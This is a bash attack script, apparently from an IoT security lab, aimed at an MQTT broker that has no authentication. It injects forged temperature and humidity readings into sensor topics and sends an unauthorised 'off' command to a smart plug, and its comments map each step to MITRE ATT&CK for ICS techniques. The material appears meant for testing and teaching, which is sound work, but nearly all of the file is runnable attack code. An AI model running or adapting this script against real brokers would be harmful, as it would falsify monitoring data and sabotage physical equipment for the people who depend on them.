#!/bin/bash
# ──────────────────────────────────────────────────────────────────────────────
# 02_inject.sh - MQTT Message Injection Attack
#
# Scenario 2: Injection of forged sensor data into the MQTT broker.
#
# Attack description:
#   The attacker publishes fake sensor readings and malicious commands to
#   legitimate topic paths. Since the broker has no authentication or ACL,
#   any client can publish to any topic. The backend (Node-RED + InfluxDB)
#   will store the forged data as if it were legitimate, corrupting the
#   integrity of the time-series database.
#
#   Additionally, the attacker sends an "off" command to the smart plug,
#   simulating a sabotage of a physical actuator.
#
# Expected result (insecure environment):
#   - Forged temperature/humidity values stored in InfluxDB
#   - Smart plug turned off remotely without authentication
#   - No detection, no alert
#
# Metrics collected:
#   - Messages injected successfully
#   - Data integrity violation (forged vs legitimate readings)
#   - Time to successful injection
#
# MITRE ATT&CK for ICS:
#   - T0831: Manipulation of Control
#   - T0832: Manipulation of View
#   - T0855: Unauthorized Command Message
# ──────────────────────────────────────────────────────────────────────────────

BROKER="${BROKER_HOST:-172.20.0.20}"
PORT="${BROKER_PORT:-1883}"
INJECT_COUNT="${INJECT_COUNT:-10}"
INJECT_INTERVAL="${INJECT_INTERVAL:-2}"

mkdir -p /attacker/results
OUTPUT_FILE="/attacker/results/02_inject_$(date +%Y%m%d_%H%M%S).log"

echo "=============================================="
echo " SCENARIO 2 - MQTT Message Injection Attack"
echo "=============================================="
echo " Target broker  : $BROKER:$PORT"
echo " Messages       : $INJECT_COUNT"
echo " Interval       : ${INJECT_INTERVAL}s"
echo " Output         : $OUTPUT_FILE"
echo "=============================================="
echo ""

SUCCESS_COUNT=0

log() {
    echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUTPUT_FILE"
}

log "[*] Starting message injection attack..."
log ""

# ── Phase 1: Inject forged temperature readings ────────────────────────────
log "[*] Phase 1: Injecting forged temperature readings..."
log "[*] Target topic: sensors/sensor_temp_01/temperature"
log ""

for i in $(seq 1 "$INJECT_COUNT"); do
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000000+00:00")
    PAYLOAD=$(cat << EOF
{"device_id": "sensor_temp_01", "firmware": "1.0.2", "timestamp": "$TIMESTAMP", "type": "temperature", "value": 99.99, "unit": "celsius", "credentials": "admin:admin123", "injected": true}
EOF
)
    mosquitto_pub \
        -h "$BROKER" \
        -p "$PORT" \
        -t "sensors/sensor_temp_01/temperature" \
        -m "$PAYLOAD" 2>/dev/null

    if [ $? -eq 0 ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        log "[+] Injected forged temperature: 99.99°C (message $i/$INJECT_COUNT)"
    else
        log "[-] Failed to inject message $i"
    fi

    sleep "$INJECT_INTERVAL"
done

# ── Phase 2: Inject forged humidity readings ───────────────────────────────
log ""
log "[*] Phase 2: Injecting forged humidity readings..."
log "[*] Target topic: sensors/sensor_temp_01/humidity"
log ""

for i in $(seq 1 "$INJECT_COUNT"); do
    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000000+00:00")
    PAYLOAD=$(cat << EOF
{"device_id": "sensor_temp_01", "firmware": "1.0.2", "timestamp": "$TIMESTAMP", "type": "humidity", "value": 0.0, "unit": "%", "credentials": "admin:admin123", "injected": true}
EOF
)
    mosquitto_pub \
        -h "$BROKER" \
        -p "$PORT" \
        -t "sensors/sensor_temp_01/humidity" \
        -m "$PAYLOAD" 2>/dev/null

    if [ $? -eq 0 ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        log "[+] Injected forged humidity: 0.0% (message $i/$INJECT_COUNT)"
    else
        log "[-] Failed to inject message $i"
    fi

    sleep "$INJECT_INTERVAL"
done

# ── Phase 3: Remote actuator sabotage ─────────────────────────────────────
log ""
log "[*] Phase 3: Sending unauthorized OFF command to smart plug..."
log "[*] Target topic: commands/sensor_power_01/set"
log ""

PAYLOAD='{"command": "off"}'

mosquitto_pub \
    -h "$BROKER" \
    -p "$PORT" \
    -t "commands/sensor_power_01/set" \
    -m "$PAYLOAD" 2>/dev/null

if [ $? -eq 0 ]; then
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    log "[+] Smart plug turned OFF via unauthorized command"
    log "[!] Physical actuator sabotaged successfully"
else
    log "[-] Failed to send actuator command"
fi

echo ""
echo "=============================================="
echo " ATTACK SUMMARY - Scenario 2"
echo "=============================================="
echo " Messages injected : $SUCCESS_COUNT"
echo " Output saved to   : $OUTPUT_FILE"
echo "=============================================="